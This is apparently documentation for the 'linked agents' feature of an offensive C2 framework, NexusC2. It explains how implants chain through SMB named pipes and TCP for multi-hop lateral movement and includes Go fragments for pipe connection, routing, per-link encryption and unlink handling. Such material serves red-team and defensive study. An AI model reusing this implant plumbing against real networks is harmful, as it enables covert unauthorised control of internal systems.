---
title: "Linked Agents"
description: "Chain agents via SMB named pipes for multi-hop network penetration."
weight: 9
---
## Overview

NexusC2 supports linking agents together via SMB named pipes, enabling command and control through internal networks where direct internet access is not available. An "edge" agent (HTTP/HTTPS) can connect to SMB agents on internal systems, creating a parent-child relationship where commands and results flow through the chain.

**Key Features:**
- Named pipe connections between agents (SMB)
- TCP socket connections for cross-platform lateral movement
- Multi-hop chain support (HTTPS → SMB → SMB → ...)
- Automatic routing and secret management
- Transparent command distribution
- Parent-child relationship tracking

**Platform:** Windows (SMB agents), Windows/Linux/macOS (TCP agents), any platform (edge agents)

---

## Architecture

{{< mermaid >}}
flowchart LR
    subgraph Internet["Internet"]
        SRV[NexusC2 Server]
    end

    subgraph DMZ["DMZ"]
        EDGE[Edge Agent<br/>HTTP/HTTPS]
    end

    subgraph Internal["Internal Network"]
        direction TB
        SMB1[SMB Agent 1<br/>hop_count=1]
        SMB2[SMB Agent 2<br/>hop_count=2]
        SMB1 <-->|Named Pipe| SMB2
    end

    SRV <-->|HTTP/HTTPS| EDGE
    EDGE <-->|Named Pipe| SMB1
{{< /mermaid >}}

---

## Link Manager

### Overview

Each Windows agent has a LinkManager singleton that tracks connections to child SMB agents:

```go
type LinkManager struct {
    links        map[string]*LinkedAgent  // routingID → LinkedAgent
    pipeToRoute  map[string]string        // pipePath → routingID
    nextID       uint32                   // Counter for routing IDs
    outboundData chan *LinkDataOut        // Data to send to server
    responseChannels map[string]chan *LinkDataOut  // Sync wait channels
    unlinkNotifications chan string       // Unlink events
}
```

### Routing IDs

The LinkManager assigns short routing IDs to each link:

```go
// Sequential hex IDs: 1, 2, 3, ..., a, b, c, ...
func (lm *LinkManager) GenerateRoutingID() string {
    id := atomic.AddUint32(&lm.nextID, 1)
    return fmt.Sprintf("%x", id)
}
```

These IDs are local to the edge agent and map to the full clientID on the server.

---

## Link Establishment

### Step 1: Link Command

The operator issues a `link` command on the edge agent:

```
link smb <target_host> [pipe_name]
```

Example:
```
link smb 192.168.1.50 spoolss
```

### Step 2: Pipe Connection

The edge agent connects to the target's named pipe:

```go
func connectToPipe(pipePath string) (net.Conn, error) {
    // Pipe path format: \\server\pipe\name
    // Example: \\192.168.1.50\pipe\spoolss

    timeout := 30 * time.Second
    deadline := time.Now().Add(timeout)

    for time.Now().Before(deadline) {
        conn, err := dialPipe(pipePath)
        if err == nil {
            return conn, nil
        }
        time.Sleep(100 * time.Millisecond)
    }
    return nil, fmt.Errorf("connection timeout")
}
```

### Step 3: Authentication

A lightweight challenge-response authentication verifies the link:

```go
func performLinkAuth(conn net.Conn) error {
    // 1. Read challenge from SMB agent
    challenge, _ := readMessage(conn)

    // 2. Sign challenge
    response := append([]byte("AUTH:"), challenge...)

    // 3. Send response
    writeMessage(conn, response)

    // 4. Read confirmation
    confirm, _ := readMessage(conn)
    if string(confirm) != "OK" {
        return fmt.Errorf("authentication failed")
    }
    return nil
}
```

### Step 4: Registration

The edge agent registers the link and starts handling data:

```go
link := &LinkedAgent{
    RoutingID: routingID,
    PipePath:  pipePath,
    Conn:      conn,
    Connected: time.Now(),
    LastSeen:  time.Now(),
    IsActive:  true,
}

lm.links[routingID] = link
lm.pipeToRoute[pipePath] = routingID

// Start data handler goroutine
go lm.handleIncomingData(link)
```

---

## Data Flow

### Commands (Server → SMB Agent)

{{< mermaid >}}
flowchart LR
    subgraph Server
        SRV[NexusC2]
    end
    subgraph Edge["Edge Host"]
        EDGE[Edge Agent]
    end
    subgraph Internal["Internal Host"]
        SMB[SMB Agent]
    end

    SRV -->|GET Response| EDGE
    EDGE -->|Named Pipe| SMB
{{< /mermaid >}}

**Flow:**
1. Server receives GET from edge agent
2. Server includes link commands in response (`lc`) and handshake responses (`lr`)
3. Edge agent forwards to each linked agent via named pipe
4. Linked agent decrypts and processes

**Response Structure:**
```json
{
  "data": "<commands for edge>",
  "lc": [{"r": "1", "p": "<encrypted>"}],
  "lr": [{"r": "3", "p": "<handshake response>"}]
}
```

### Results (SMB Agent → Server)

{{< mermaid >}}
flowchart RL
    subgraph Internal["Internal Host"]
        SMB[SMB Agent]
    end
    subgraph Edge["Edge Host"]
        EDGE[Edge Agent]
    end
    subgraph Server
        SRV[NexusC2]
    end

    SMB -->|Named Pipe| EDGE
    EDGE -->|POST Request| SRV
{{< /mermaid >}}

**Flow:**
1. SMB agent sends encrypted results via named pipe
2. Edge agent collects in outbound queue
3. Edge agent includes link data (`ld`) and unlink notifications (`lu`) in POST
4. Server decrypts each linked agent's payload
5. Server processes results normally

**POST Structure:**
```json
{
  "agent_id": "<edge_id>",
  "results": [<edge results>],
  "ld": [{"r": "1", "p": "<encrypted results>"}],
  "lu": ["3"]
}
```

---

## Handshake Flow

### New SMB Agent Registration

When an edge agent links to a new SMB agent:

```
1. SMB agent sends handshake (RSA+AES encrypted)
   - Includes system info, seed for key derivation

2. Edge agent queues handshake in outbound data

3. Edge agent sends handshake to server via POST
   {"ld": [{"r": "1", "p": "<encrypted handshake>"}]}

4. Server processes handshake:
   - Finds matching init data
   - Decrypts and validates
   - Creates new connection entry
   - Registers link routing
   - Signs handshake response

5. Server queues response for next GET poll

6. Edge agent receives response in GET:
   {"lr": [{"r": "1", "p": "<handshake response>"}]}

7. Edge agent forwards to SMB agent via pipe

8. SMB agent validates signature, derives secrets
```

---

## Multi-Hop Chains

### Overview

SMB agents can themselves link to other SMB agents, creating chains:

```
HTTPS Agent → SMB Agent A → SMB Agent B → SMB Agent C
   (edge)      (hop 1)        (hop 2)        (hop 3)
```

### Command Distribution

Commands flow recursively through the chain:

```go
// Server side: build nested commands for grandchildren
func (m *Manager) getCommandsForLinkedAgents(edgeClientID string) {
    for _, linkedClientID := range linkedAgents {
        // Get commands for this linked agent
        pendingCmds, _ := m.commandBuffer.GetCommand(linkedClientID)

        // RECURSIVE: Get nested data for this agent's children
        nestedHandshakes, nestedCommands, _ := m.getPendingLinkResponsesSeparate(linkedClientID)

        // Build combined payload
        payload := map[string]interface{}{
            "commands": cmds,
            "lr": nestedHandshakes,  // Nested handshake responses
            "lc": nestedCommands,    // Nested link commands
        }

        // Encrypt and add to response
    }
}
```

### Result Collection

Results flow back up the chain:

```go
// Server side: process nested link data recursively
func (m *Manager) processLinkData(edgeClientID string, linkData []interface{}) {
    for _, item := range linkData {
        // Decrypt linked agent's payload
        linkedData := decryptLinkedPayload(payload, linkedConn.Secret1)

        // Process this agent's results
        m.processResults(ctx, tx, linkedClientID, linkedData.Results)

        // RECURSIVE: Process nested link data from grandchildren
        if len(linkedData.NestedLinkData) > 0 {
            m.processLinkData(linkedClientID, linkedData.NestedLinkData)
        }
    }
}
```

---

## Server-Side Routing

### Database Schema

**link_routing Table:**

| Column | Type | Description |
|--------|------|-------------|
| edge_clientID | UUID | Parent/edge agent |
| routing_id | VARCHAR | Short routing ID |
| linked_clientID | UUID | Child/linked agent |
| link_type | VARCHAR | Link type ("smb") |
| created_at | TIMESTAMP | When link was established |
| last_seen | TIMESTAMP | Last activity |
| status | VARCHAR | "active" or "disconnected" |

**connections Table (link-related fields):**

| Column | Type | Description |
|--------|------|-------------|
| parent_clientID | UUID | Parent agent (NULL for direct) |
| link_type | VARCHAR | Link type (NULL for direct) |
| hop_count | INTEGER | Distance from initial agent |

### Route Resolution

```go
func (lr *LinkRouting) ResolveRoutingID(edgeClientID, routingID string) (string, error) {
    var linkedClientID string
    err := lr.db.QueryRow(`
        SELECT linked_clientID FROM link_routing
        WHERE edge_clientID = $1 AND routing_id = $2 AND status = 'active'`,
        edgeClientID, routingID).Scan(&linkedClientID)
    return linkedClientID, err
}
```

---

## Message Protocol

### Pipe Message Format

Messages are length-prefixed:

```go
func writeMessage(conn net.Conn, data []byte) error {
    // 4-byte little-endian length + data
    length := uint32(len(data))
    header := []byte{
        byte(length),
        byte(length >> 8),
        byte(length >> 16),
        byte(length >> 24),
    }
    conn.Write(header)
    conn.Write(data)
    return nil
}

func readMessage(conn net.Conn) ([]byte, error) {
    header := make([]byte, 4)
    conn.Read(header)
    length := uint32(header[0]) | uint32(header[1])<<8 | ...
    data := make([]byte, length)
    conn.Read(data)
    return data, nil
}
```

### Message Types

| Type | Description |
|------|-------------|
| `data` | Regular command/result payload |
| `handshake` | Initial registration from SMB agent |
| `disconnect` | Graceful unlink notification |

---

## Unlink Process

### Edge Agent Side

```go
func (c *UnlinkCommand) Execute(args []string) {
    routingID := args[0]
    lm := GetLinkManager()

    // Send graceful disconnect
    sendDisconnectMessage(link.Conn)

    // Close connection
    link.Conn.Close()
    link.IsActive = false

    // Queue unlink notification for server
    lm.unlinkNotifications <- routingID

    // Clean up maps
    delete(lm.links, routingID)
    delete(lm.pipeToRoute, link.PipePath)
}
```

### Server Side

```go
func (lr *LinkRouting) DisconnectLink(edgeClientID, routingID string) {
    // Mark link as disconnected
    lr.db.Exec(`
        UPDATE link_routing SET status = 'disconnected'
        WHERE edge_clientID = $1 AND routing_id = $2`,
        edgeClientID, routingID)

    // Clear parent relationship in connections
    lr.db.Exec(`
        UPDATE connections SET parent_clientID = NULL, link_type = NULL
        WHERE newclientID = $1`,
        linkedClientID)
}
```

---

## Encryption

### Per-Link Encryption

Each linked agent has its own encryption keys:

```go
// Encrypt command for linked agent
func encryptForLinkedAgent(data []byte, secret string) (string, error) {
    key := sha256.Sum256([]byte(secret))
    block, _ := aes.NewCipher(key[:])
    aesGCM, _ := cipher.NewGCM(block)
    nonce := make([]byte, aesGCM.NonceSize())
    rand.Read(nonce)
    ciphertext := aesGCM.Seal(nonce, nonce, data, nil)
    return base64.StdEncoding.EncodeToString(ciphertext), nil
}

// Decrypt results from linked agent
func decryptLinkedPayload(payload string, secret string) ([]byte, error) {
    ciphertext, _ := base64.StdEncoding.DecodeString(payload)
    key := sha256.Sum256([]byte(secret))
    block, _ := aes.NewCipher(key[:])
    aesGCM, _ := cipher.NewGCM(block)
    nonce := ciphertext[:aesGCM.NonceSize()]
    ciphertext = ciphertext[aesGCM.NonceSize():]
    return aesGCM.Open(nil, nonce, ciphertext, nil)
}
```

### Key Rotation

Linked agents rotate secrets after each exchange, just like direct agents.

---

## Link Commands

### Available Commands

| Command | Description |
|---------|-------------|
| `link smb <host> [pipe]` | Connect to SMB agent |
| `unlink <routing_id>` | Disconnect from SMB agent |
| `links` | List active links |

### Link Output Format

```
S6|\\192.168.1.50\pipe\spoolss|1|Q
    │                          │ └─ Handshake status (P=pending, Q=queued)
    │                          └─── Routing ID
    └────────────────────────────── Pipe path
```

---

## Limitations

| Limitation | Description |
|------------|-------------|
| Windows Only | SMB agents require Windows |
| Latency | Multi-hop adds round-trip latency |
| Single Path | No redundant routes |
| Queue Size | 100 item outbound buffer |
| Message Size | 10MB maximum per message |

---

## Related Files

| Component | File Path |
|-----------|-----------|
| Edge Link Commands | `server/docker/payloads/Windows/action_link.go` |
| Link Manager | `server/docker/payloads/Windows/link_manager.go` |
| Pipe Connection | `server/docker/payloads/Windows/link_pipe_windows.go` |
| SMB Agent Link | `server/docker/payloads/SMB_Windows/action_link.go` |
| Server Link Handler | `server/internal/agent/listeners/handler_link.go` |
| Database Schema | `server/docker/db/create-tables.sql` |
